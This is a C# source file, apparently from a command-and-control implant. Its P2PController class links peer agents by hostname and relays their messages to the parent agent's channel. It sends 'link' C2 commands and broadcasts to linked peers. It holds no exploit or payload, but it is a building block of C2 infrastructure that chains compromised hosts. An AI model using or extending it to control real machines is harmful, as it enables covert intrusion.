using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Controllers
{
    class P2PController
    {
        AgentController Agent;

        Dictionary<string, ICommModule> P2PAgents;

        public P2PController(AgentController agent)
        {
            Agent = agent;
            P2PAgents = new Dictionary<string, ICommModule>();
        }

        public void Start()
        {
            Task.Factory.StartNew(delegate ()
            {
                while (true)
                {
                    foreach (var module in P2PAgents.Values)
                    {
                        if (module.RecvData(out AgentMessage message) == true)
                        {
                            if (!string.IsNullOrEmpty(message.Data.Module))
                            {
                                Agent.CommModule.SendData(message);
                            }
                        }
                    }

                    Thread.Sleep(1000);
                }
            });
        }

        public void BroadcastMessage(AgentMessage message)
        {
            var modules = P2PAgents.Values.ToList();

            foreach (var module in modules)
            {
                module.SendData(message);
            }
        }

        public void LinkAgent(string hostname, ICommModule commModule)
        {
            P2PAgents.Add(hostname, commModule);
            P2PAgents[hostname].Start();

            P2PAgents[hostname].SendData(new AgentMessage
            {
                Data = new C2Data
                {
                    Module = "link",
                    Command = "IncomingLink",
                    Data = Encoding.UTF8.GetBytes(Agent.AgentMetadata.AgentID)
                }
            });
        }

        public void UnlinkAgent(string hostname)
        {
            if (P2PAgents.ContainsKey(hostname))
            {
                P2PAgents[hostname].SendData(new AgentMessage
                {
                    Data = new C2Data
                    {
                        Module = "link",
                        Command = "IncomingUnlink"
                    }
                });

                P2PAgents[hostname].Stop();
                P2PAgents.Remove(hostname);
            }
        }
    }
}